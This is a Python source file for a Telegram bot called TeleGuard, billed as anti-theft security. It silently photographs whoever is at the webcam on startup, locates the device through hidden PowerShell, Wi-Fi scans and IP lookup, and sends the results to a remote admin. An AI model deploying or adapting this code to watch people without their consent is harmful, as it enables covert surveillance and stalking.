"""
TeleGuard - Telegram Security Bot
==================================

A security monitoring bot that captures webcam photos and location data,
stores them offline, and sends to Telegram when internet is available.

Features:
    - Auto-capture webcam photos on startup
    - GPS/Wi-Fi and IP-based location tracking
    - Offline storage with automatic sync
    - Silent background operation
    - Real-time Telegram notifications

Author: TeleGuard Team
License: MIT
Version: 1.0.0
"""

import asyncio
import cv2
import requests
import os
import sys
import time
import threading
import json
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
except ImportError:
    print("[ERROR] python-telegram-bot not installed")
    print("        Run: pip install python-telegram-bot")
    sys.exit(1)


# ============================================
# CONFIGURATION
# ============================================

class Config:
    """Application configuration - reads from config.txt"""
    
    # Will be loaded from config.txt
    BOT_TOKEN: str = ""
    ADMIN_ID: int = 0
    
    # Directories - works for both .py and .exe
    if getattr(sys, 'frozen', False):
        BASE_DIR: Path = Path(sys.executable).parent
    else:
        BASE_DIR: Path = Path(__file__).parent
    
    CAPTURE_DIR: Path = BASE_DIR / "captures"
    CONFIG_FILE: Path = BASE_DIR / "config.json"
    CONFIG_TXT: Path = BASE_DIR / "config.txt"
    
    # Capture settings
    STARTUP_CAPTURES: int = 3
    CAPTURE_DELAY: float = 2.0
    CAMERA_WARMUP: int = 10
    
    # Network settings
    INTERNET_CHECK_URL: str = "https://api.telegram.org"
    INTERNET_TIMEOUT: int = 5
    LOCATION_API: str = "http://ip-api.com/json/"
    
    @classmethod
    def load_config(cls):
        """Load configuration from config.txt"""
        if not cls.CONFIG_TXT.exists():
            # Create default config.txt
            with open(cls.CONFIG_TXT, 'w') as f:
                f.write("# TeleGuard Configuration\n")
                f.write("# Get BOT_TOKEN from @BotFather on Telegram\n")
                f.write("# Get ADMIN_ID from @userinfobot on Telegram\n\n")
                f.write("BOT_TOKEN=YOUR_TOKEN_HERE\n")
                f.write("ADMIN_ID=0\n")
            return False
        
        try:
            with open(cls.CONFIG_TXT, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or '=' not in line:
                        continue
                    key, value = line.split('=', 1)
                    key = key.strip()
                    value = value.strip()
                    
                    if key == 'BOT_TOKEN':
                        cls.BOT_TOKEN = value
                    elif key == 'ADMIN_ID':
                        cls.ADMIN_ID = int(value) if value.isdigit() else 0
            return True
        except Exception as e:
            print(f"Error loading config: {e}")
            return False
    
    @classmethod
    def ensure_dirs(cls):
        """Ensure required directories exist"""
        cls.CAPTURE_DIR.mkdir(exist_ok=True)


# ============================================
# UTILITIES
# ============================================

class ProgressBar:
    """Animated progress bar for console output"""
    
    def __init__(self, total: int, prefix: str = "", width: int = 40):
        self.total = total
        self.prefix = prefix
        self.width = width
        self.current = 0
    
    def update(self, step: int = 1):
        self.current += step
        self._render()
    
    def _render(self):
        # Skip if no console (noconsole mode)
        if sys.stdout is None:
            return
        try:
            percent = self.current / self.total
            filled = int(self.width * percent)
            bar = "█" * filled + "░" * (self.width - filled)
            sys.stdout.write(f"\r{self.prefix} [{bar}] {percent*100:.0f}%")
            sys.stdout.flush()
            if self.current >= self.total:
                print()
        except:
            pass
    
    @staticmethod
    def spinner(message: str, duration: float = 2.0):
        """Show a spinner animation"""
        # Skip if no console (noconsole mode)
        if sys.stdout is None:
            time.sleep(duration)
            return
        try:
            frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
            end_time = time.time() + duration
            i = 0
            while time.time() < end_time:
                sys.stdout.write(f"\r{frames[i % len(frames)]} {message}")
                sys.stdout.flush()
                time.sleep(0.1)
                i += 1
            sys.stdout.write("\r" + " " * (len(message) + 3) + "\r")
        except:
            time.sleep(duration)


class Logger:
    """Simple logger - handles noconsole mode"""
    
    @staticmethod
    def _print(msg: str):
        """Safe print that works in noconsole mode"""
        if sys.stdout is not None:
            try:
                print(msg)
            except:
                pass
    
    @staticmethod
    def info(msg: str):
        Logger._print(f"[INFO] {msg}")
    
    @staticmethod
    def success(msg: str):
        Logger._print(f"[OK] {msg}")
    
    @staticmethod
    def warning(msg: str):
        Logger._print(f"[WARN] {msg}")
    
    @staticmethod
    def error(msg: str):
        Logger._print(f"[ERROR] {msg}")
    
    @staticmethod
    def camera(msg: str):
        Logger._print(f"[CAM] {msg}")
    
    @staticmethod
    def location(msg: str):
        Logger._print(f"[LOC] {msg}")
    
    @staticmethod
    def telegram(msg: str):
        Logger._print(f"[TG] {msg}")


log = Logger()


# ============================================
# STORAGE MANAGER
# ============================================

class StorageManager:
    """Manages local storage for captures and config"""
    
    def __init__(self):
        Config.ensure_dirs()
        self.admin_id: Optional[int] = None
        self._load_config()
    
    def _load_config(self):
        """Load configuration from file"""
        if Config.CONFIG_FILE.exists():
            try:
                with open(Config.CONFIG_FILE, 'r') as f:
                    data = json.load(f)
                    self.admin_id = data.get("admin_id")
            except Exception as e:
                log.warning(f"Failed to load config: {e}")
    
    def save_config(self):
        """Save configuration to file"""
        try:
            with open(Config.CONFIG_FILE, 'w') as f:
                json.dump({"admin_id": self.admin_id}, f)
        except Exception as e:
            log.error(f"Failed to save config: {e}")
    
    def set_admin(self, chat_id: int):
        """Set admin chat ID"""
        self.admin_id = chat_id
        self.save_config()
        log.success(f"Admin registered: {chat_id}")
    
    def get_pending_files(self) -> List[Path]:
        """Get list of files waiting to be sent"""
        photos = list(Config.CAPTURE_DIR.glob("*.jpg"))
        # Only get location_* json files, not config files
        locations = list(Config.CAPTURE_DIR.glob("location_*.json"))
        return photos + locations
    
    def delete_file(self, filepath: Path):
        """Delete a file after sending"""
        try:
            os.remove(filepath)
        except Exception as e:
            log.warning(f"Failed to delete {filepath}: {e}")


storage = StorageManager()


# ============================================
# NETWORK UTILITIES
# ============================================

class NetworkManager:
    """Handles network-related operations"""
    
    @staticmethod
    def check_internet() -> bool:
        """Check if internet connection is available"""
        try:
            requests.get(Config.INTERNET_CHECK_URL, timeout=Config.INTERNET_TIMEOUT)
            return True
        except:
            return False
    
    @staticmethod
    def get_windows_location() -> Optional[Dict]:
        """Try to get precise location from Windows Location API with retries"""
        try:
            import subprocess
            
            # Use PowerShell to get Windows Location with longer timeout
            ps_script = '''
Add-Type -AssemblyName System.Device
$watcher = New-Object System.Device.Location.GeoCoordinateWatcher("High")
$watcher.Start()
$count = 0
while (($watcher.Status -ne 'Ready') -and ($count -lt 60)) {
    Start-Sleep -Milliseconds 500
    $count++
}
if ($watcher.Status -eq 'Ready') {
    $coord = $watcher.Position.Location
    if (($coord.Latitude -ne 'NaN') -and ($coord.Longitude -ne 'NaN')) {
        Write-Output "$($coord.Latitude),$($coord.Longitude),$($coord.HorizontalAccuracy)"
    }
}
$watcher.Stop()
'''
            result = subprocess.run(
                ['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script],
                capture_output=True, text=True, timeout=40,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.stdout.strip():
                parts = result.stdout.strip().split(',')
                if len(parts) >= 2:
                    try:
                        lat = float(parts[0])
                        lon = float(parts[1])
                        accuracy = float(parts[2]) if len(parts) > 2 else 0
                        
                        if lat != 0 and lon != 0 and abs(lat) <= 90 and abs(lon) <= 180:
                            log.success(f"Windows Location: {lat}, {lon} (±{accuracy}m)")
                            return {
                                "lat": lat,
                                "lon": lon,
                                "accuracy": accuracy,
                                "source": "GPS/Wi-Fi (Precise)"
                            }
                    except ValueError:
                        pass
        except Exception as e:
            log.warning(f"Windows Location failed: {e}")
        return None
    
    @staticmethod
    def get_wifi_location() -> Optional[Dict]:
        """Try to get location using Wi-Fi networks via Mozilla Location Service"""
        try:
            import subprocess
            
            # Get nearby Wi-Fi networks using netsh
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                capture_output=True, text=True, timeout=10,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if not result.stdout:
                return None
            
            # Parse Wi-Fi networks
            wifi_networks = []
            current_ssid = None
            current_bssid = None
            current_signal = None
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if 'SSID' in line and 'BSSID' not in line:
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        current_ssid = parts[1].strip()
                elif 'BSSID' in line:
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        current_bssid = parts[1].strip().lower()
                elif 'Signal' in line or 'سیگنال' in line:
                    parts = line.split(':', 1)
                    if len(parts) > 1:
                        try:
                            signal_str = parts[1].strip().replace('%', '')
                            current_signal = int(signal_str)
                            if current_bssid:
                                # Convert signal percentage to dBm (approximate)
                                signal_dbm = int((current_signal / 2) - 100)
                                wifi_networks.append({
                                    "macAddress": current_bssid,
                                    "signalStrength": signal_dbm
                                })
                        except:
                            pass
            
            if len(wifi_networks) >= 2:
                # Use Mozilla Location Service (free, no API key needed)
                payload = {
                    "wifiAccessPoints": wifi_networks[:10]  # Max 10 networks
                }
                
                response = requests.post(
                    "https://location.services.mozilla.com/v1/geolocate?key=test",
                    json=payload,
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if "location" in data:
                        lat = data["location"]["lat"]
                        lon = data["location"]["lng"]
                        accuracy = data.get("accuracy", 100)
                        
                        log.success(f"Wi-Fi Location: {lat}, {lon} (±{accuracy}m)")
                        return {
                            "lat": lat,
                            "lon": lon,
                            "accuracy": accuracy,
                            "source": "Wi-Fi Networks (Precise)"
                        }
        except Exception as e:
            log.warning(f"Wi-Fi Location failed: {e}")
        return None
    
    @staticmethod
    def get_location() -> Optional[Dict]:
        """Get location - tries multiple methods for best accuracy"""
        
        precise_loc = None
        
        # Try Windows Location first (most accurate if GPS available)
        win_loc = NetworkManager.get_windows_location()
        if win_loc:
            precise_loc = win_loc
        
        # Try Wi-Fi location as fallback (more accurate than IP)
        if not precise_loc:
            wifi_loc = NetworkManager.get_wifi_location()
            if wifi_loc:
                precise_loc = wifi_loc
        
        # Get IP-based location for additional info (city, country, etc.)
        try:
            response = requests.get(Config.LOCATION_API, timeout=10)
            data = response.json()
            
            if data.get("status") == "success":
                result = {
                    "ip": data.get("query", "Unknown"),
                    "country": data.get("country", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "isp": data.get("isp", "Unknown"),
                    "timezone": data.get("timezone", "Unknown"),
                }
                
                # Use precise location if available
                if precise_loc:
                    result["lat"] = precise_loc["lat"]
                    result["lon"] = precise_loc["lon"]
                    result["accuracy"] = precise_loc.get("accuracy", 0)
                    result["source"] = precise_loc["source"]
                else:
                    # Fall back to IP location (least accurate)
                    result["lat"] = data.get("lat", 0)
                    result["lon"] = data.get("lon", 0)
                    result["source"] = "IP Address (Approximate ~1-5km)"
                
                return result
                
        except Exception as e:
            log.error(f"Location fetch failed: {e}")
        
        # If all else fails but we have precise location
        if precise_loc:
            return {
                "lat": precise_loc["lat"],
                "lon": precise_loc["lon"],
                "accuracy": precise_loc.get("accuracy", 0),
                "source": precise_loc["source"],
                "ip": "Unknown",
                "country": "Unknown",
                "city": "Unknown",
                "region": "Unknown",
                "isp": "Unknown",
                "timezone": "Unknown"
            }
        
        return None


network = NetworkManager()


# ============================================
# WEBCAM CAPTURE
# ============================================

class WebcamCapture:
    """Handles webcam capture operations"""
    
    @staticmethod
    def capture(save_path: Optional[Path] = None) -> Optional[Path]:
        """Capture a single frame from webcam"""
        try:
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                log.error("Webcam not found or inaccessible")
                return None
            
            # Warmup - let camera adjust
            for _ in range(Config.CAMERA_WARMUP):
                cap.read()
                time.sleep(0.05)
            
            # Capture frame
            ret, frame = cap.read()
            cap.release()
            
            if not ret or frame is None:
                log.error("Failed to capture frame")
                return None
            
            # Generate filename if not provided
            if save_path is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                save_path = Config.CAPTURE_DIR / f"capture_{timestamp}.jpg"
            
            # Save image
            cv2.imwrite(str(save_path), frame)
            return save_path
            
        except Exception as e:
            log.error(f"Capture error: {e}")
            return None
    
    @staticmethod
    def startup_capture():
        """Capture photos on system startup"""
        print("\n" + "=" * 50)
        log.camera("Starting automatic capture sequence...")
        print("=" * 50 + "\n")
        
        progress = ProgressBar(
            Config.STARTUP_CAPTURES,
            prefix="📷 Capturing",
            width=30
        )
        
        captured = 0
        for i in range(Config.STARTUP_CAPTURES):
            time.sleep(Config.CAPTURE_DELAY)
            
            photo = WebcamCapture.capture()
            if photo:
                captured += 1
                log.success(f"Photo {i+1} saved: {photo.name}")
            else:
                log.error(f"Photo {i+1} failed")
            
            progress.update()
        
        # Also save location
        log.location("Fetching location data...")
        location = network.get_location()
        if location:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            loc_file = Config.CAPTURE_DIR / f"location_{timestamp}.json"
            with open(loc_file, 'w') as f:
                json.dump(location, f, ensure_ascii=False, indent=2)
            log.success(f"Location saved: {location['city']}, {location['country']}")
        
        print("\n" + "=" * 50)
        log.success(f"Capture complete! {captured}/{Config.STARTUP_CAPTURES} photos saved")
        print("=" * 50 + "\n")


webcam = WebcamCapture()


# ============================================
# TELEGRAM BOT HANDLERS
# ============================================

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with loading animation"""
    storage.set_admin(update.effective_chat.id)
    
    # Animated startup
    msg = await update.message.reply_text("🔐 *TeleGuard*\n\n⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜ 0%", parse_mode="Markdown")
    
    stages = [
        "🔐 *TeleGuard*\n\n🟩⬜⬜⬜⬜⬜⬜⬜⬜⬜ 10%\n\n_Initializing..._",
        "🔐 *TeleGuard*\n\n🟩🟩🟩⬜⬜⬜⬜⬜⬜⬜ 30%\n\n_Loading modules..._",
        "🔐 *TeleGuard*\n\n🟩🟩🟩🟩🟩⬜⬜⬜⬜⬜ 50%\n\n_Connecting..._",
        "🔐 *TeleGuard*\n\n🟩🟩🟩🟩🟩🟩🟩⬜⬜⬜ 70%\n\n_Registering admin..._",
        "🔐 *TeleGuard*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜ 90%\n\n_Almost ready..._",
        "🔐 *TeleGuard*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 100%\n\n✅ *Ready!*",
    ]
    
    for stage in stages:
        try:
            await msg.edit_text(stage, parse_mode="Markdown")
            await asyncio.sleep(0.3)
        except:
            pass
    
    await asyncio.sleep(0.5)
    
    keyboard = [
        [InlineKeyboardButton("📷 Capture Photo", callback_data="capture")],
        [InlineKeyboardButton("📍 Get Location", callback_data="location")],
        [InlineKeyboardButton("📂 Pending Files", callback_data="pending")],
        [InlineKeyboardButton("ℹ️ Status", callback_data="status")],
    ]
    
    text = """
🔐 *TeleGuard Security Bot*

✅ You are now registered as admin!

*Features:*
• 📷 Webcam capture on demand
• 📍 IP-based location tracking  
• 💾 Offline storage & auto-sync
• 🔔 Startup notifications

Select an option below:
"""
    
    await msg.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    
    # Send any pending files
    await send_pending_files(context.application)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    text = """
📖 *TeleGuard Help*

*Commands:*
/start - Register & show menu
/help - Show this help
/capture - Take webcam photo
/location - Get current location
/status - Show system status

*How it works:*
1. Bot runs silently on startup
2. Captures photos automatically
3. Saves location data
4. Sends everything to you via Telegram

*Privacy:*
All data is sent only to you (the admin).
"""
    await update.message.reply_text(text, parse_mode="Markdown")


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    action = query.data
    
    if action == "capture":
        await handle_capture(query)
    elif action == "location":
        await handle_location(query)
    elif action == "pending":
        await handle_pending(query, context)
    elif action == "status":
        await handle_status(query)
    elif action == "menu":
        await show_menu(query)


async def handle_capture(query):
    """Handle capture button with animated progress"""
    
    # Animated loading in Telegram with green squares
    stages = [
        "📷 *Initializing camera...*\n\n⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜ 0%",
        "📷 *Warming up...*\n\n🟩🟩⬜⬜⬜⬜⬜⬜⬜⬜ 20%",
        "📷 *Adjusting focus...*\n\n🟩🟩🟩🟩⬜⬜⬜⬜⬜⬜ 40%",
        "📷 *Capturing frame...*\n\n🟩🟩🟩🟩🟩🟩⬜⬜⬜⬜ 60%",
        "📷 *Processing image...*\n\n🟩🟩🟩🟩🟩🟩🟩🟩⬜⬜ 80%",
        "📷 *Saving photo...*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 100%",
    ]
    
    for stage in stages:
        try:
            await query.edit_message_text(stage, parse_mode="Markdown")
            await asyncio.sleep(0.3)
        except:
            pass
    
    photo = webcam.capture()
    
    if photo:
        await query.edit_message_text("📤 *Uploading...*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 ✓", parse_mode="Markdown")
        with open(photo, 'rb') as f:
            await query.message.reply_photo(
                photo=f,
                caption=f"📷 *Captured Successfully!*\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                parse_mode="Markdown"
            )
        storage.delete_file(photo)
        await query.edit_message_text("✅ *Photo captured and sent!*", parse_mode="Markdown", reply_markup=back_keyboard())
    else:
        await query.edit_message_text("❌ *Webcam not available*\n\nMake sure camera is connected.", parse_mode="Markdown", reply_markup=back_keyboard())


async def handle_location(query):
    """Handle location button with animated progress"""
    
    # Animated loading with green squares
    stages = [
        "📍 *Connecting to server...*\n\n⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜ 0%",
        "📍 *Getting IP address...*\n\n🟩🟩🟩⬜⬜⬜⬜⬜⬜⬜ 30%",
        "📍 *Fetching geolocation...*\n\n🟩🟩🟩🟩🟩🟩⬜⬜⬜⬜ 60%",
        "📍 *Processing data...*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩⬜ 90%",
        "📍 *Complete!*\n\n🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 100%",
    ]
    
    for stage in stages:
        try:
            await query.edit_message_text(stage, parse_mode="Markdown")
            await asyncio.sleep(0.25)
        except:
            pass
    
    info = network.get_location()
    
    if info:
        text = f"""
📍 *Location Information*

🌐 *IP:* `{info['ip']}`
🏳️ *Country:* {info['country']}
🏙️ *City:* {info['city']}
📍 *Region:* {info['region']}
📡 *ISP:* {info['isp']}
🕐 *Timezone:* {info['timezone']}

✅ *Location fetched successfully!*
"""
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())
        
        if info['lat'] and info['lon']:
            await query.message.reply_location(latitude=info['lat'], longitude=info['lon'])
    else:
        await query.edit_message_text("❌ *Could not fetch location*\n\nCheck internet connection.", parse_mode="Markdown", reply_markup=back_keyboard())


async def handle_pending(query, context):
    """Handle pending files button with progress"""
    files = storage.get_pending_files()
    
    if not files:
        await query.edit_message_text("📂 *No pending files*\n\nAll files have been synced!", parse_mode="Markdown", reply_markup=back_keyboard())
        return
    
    total = len(files)
    
    # Show progress for each file
    for i, filepath in enumerate(files):
        percent = int((i / total) * 100)
        filled = int(percent / 10)
        bar = "█" * filled + "░" * (10 - filled)
        
        try:
            await query.edit_message_text(
                f"📤 *Sending files...*\n\n"
                f"File {i+1}/{total}: `{filepath.name}`\n\n"
                f"`[{bar}]` {percent}%",
                parse_mode="Markdown"
            )
        except:
            pass
        
        await asyncio.sleep(0.2)
    
    await send_pending_files(context.application)
    await query.edit_message_text(
        f"✅ *All {total} files sent!*\n\n`[██████████]` 100%",
        parse_mode="Markdown",
        reply_markup=back_keyboard()
    )


async def handle_status(query):
    """Handle status button"""
    files = storage.get_pending_files()
    internet = "✅ Connected" if network.check_internet() else "❌ Disconnected"
    
    text = f"""
ℹ️ *System Status*

🌐 *Internet:* {internet}
📂 *Pending files:* {len(files)}
👤 *Admin ID:* `{storage.admin_id}`
📁 *Capture dir:* `{Config.CAPTURE_DIR.name}/`
"""
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_keyboard())


async def show_menu(query):
    """Show main menu"""
    keyboard = [
        [InlineKeyboardButton("📷 Capture Photo", callback_data="capture")],
        [InlineKeyboardButton("📍 Get Location", callback_data="location")],
        [InlineKeyboardButton("📂 Pending Files", callback_data="pending")],
        [InlineKeyboardButton("ℹ️ Status", callback_data="status")],
    ]
    await query.edit_message_text(
        "🔐 *TeleGuard Menu*\n\nSelect an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def back_keyboard():
    """Create back to menu keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")]
    ])


async def send_pending_files(app):
    """Send all pending files to admin"""
    if not storage.admin_id:
        log.warning("No admin registered, skipping file sync")
        return
    
    files = storage.get_pending_files()
    if not files:
        return
    
    log.telegram(f"Sending {len(files)} pending files...")
    
    for filepath in files:
        try:
            if filepath.suffix == ".jpg":
                with open(filepath, 'rb') as f:
                    await app.bot.send_photo(
                        chat_id=storage.admin_id,
                        photo=f,
                        caption=f"📷 *Auto-capture*\n📁 `{filepath.name}`",
                        parse_mode="Markdown"
                    )
            elif filepath.suffix == ".json" and "location" in filepath.name:
                with open(filepath, 'r') as f:
                    info = json.load(f)
                
                text = f"📍 *Saved Location*\n🌐 IP: `{info.get('ip')}`\n🏙️ {info.get('city')}, {info.get('country')}"
                await app.bot.send_message(
                    chat_id=storage.admin_id,
                    text=text,
                    parse_mode="Markdown"
                )
                
                if info.get('lat') and info.get('lon'):
                    await app.bot.send_location(
                        chat_id=storage.admin_id,
                        latitude=info['lat'],
                        longitude=info['lon']
                    )
            
            storage.delete_file(filepath)
            log.success(f"Sent: {filepath.name}")
            
        except Exception as e:
            log.error(f"Failed to send {filepath.name}: {e}")


# ============================================
# MAIN APPLICATION
# ============================================

def print_banner():
    """Print startup banner (safe for noconsole mode)"""
    if sys.stdout is None:
        return
    try:
        banner = """
==============================================================
                                                              
   TELEGUARD - Telegram Security Bot v1.0.0                  
                                                              
==============================================================
   Webcam Capture    |    Location Tracking                  
   Offline Storage   |    Telegram Alerts                    
==============================================================
        """
        print(banner)
    except:
        pass


def main():
    """Main entry point"""
    print_banner()
    
    # Load configuration from config.txt
    if not Config.load_config():
        log.error("config.txt not found! Creating template...")
        log.info("Please edit config.txt with your settings")
        log.info("Then run TeleGuard again")
        sys.exit(1)
    
    # Check token
    if not Config.BOT_TOKEN or Config.BOT_TOKEN == "YOUR_TOKEN_HERE":
        log.error("Bot token not configured!")
        log.info("Edit config.txt and set your BOT_TOKEN")
        sys.exit(1)
    
    # Check admin ID
    if Config.ADMIN_ID == 0:
        log.error("Admin ID not configured!")
        log.info("Edit config.txt and set your ADMIN_ID")
        sys.exit(1)
    
    log.success(f"Config loaded! Admin ID: {Config.ADMIN_ID}")
    
    # Set admin from config
    storage.admin_id = Config.ADMIN_ID
    storage.save_config()
    
    # Initialize
    ProgressBar.spinner("Initializing...", 1.0)
    Config.ensure_dirs()
    
    # Startup capture in background thread
    capture_thread = threading.Thread(target=webcam.startup_capture, daemon=True)
    capture_thread.start()
    
    # Build Telegram application
    log.telegram("Connecting to Telegram...")
    app = Application.builder().token(Config.BOT_TOKEN).build()
    
    # Register handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Send startup alert
    async def send_startup_alert(application):
        """Send alert to admin when device starts"""
        if not storage.admin_id:
            log.warning("No admin registered, skipping startup alert")
            return
        
        log.telegram("Sending startup alert...")
        
        # Wait for internet
        attempts = 0
        while not network.check_internet() and attempts < 30:
            time.sleep(2)
            attempts += 1
        
        if not network.check_internet():
            log.error("No internet connection for alert")
            return
        
        # Get location
        location = network.get_location()
        
        # Build alert message
        alert = f"""
🚨 *STARTUP ALERT* 🚨

🖥️ *Device has been turned ON!*
🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

"""
        if location:
            alert += f"""📍 *Location:*
🌐 IP: `{location['ip']}`
🏙️ City: {location['city']}
🏳️ Country: {location['country']}
📡 ISP: {location['isp']}
"""
        
        alert += "\n⚠️ *Check pending files for webcam captures!*"
        
        try:
            await application.bot.send_message(
                chat_id=storage.admin_id,
                text=alert,
                parse_mode="Markdown"
            )
            
            # Send location map
            if location and location.get('lat') and location.get('lon'):
                await application.bot.send_location(
                    chat_id=storage.admin_id,
                    latitude=location['lat'],
                    longitude=location['lon']
                )
            
            log.success("Startup alert sent!")
            
            # Send pending files
            await send_pending_files(application)
            
        except Exception as e:
            log.error(f"Failed to send startup alert: {e}")
    
    # Add post_init to send alert
    app.post_init = send_startup_alert
    
    # Start bot
    log.success("Bot is now running!")
    log.info("Press Ctrl+C to stop\n")
    
    app.run_polling(allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    main()
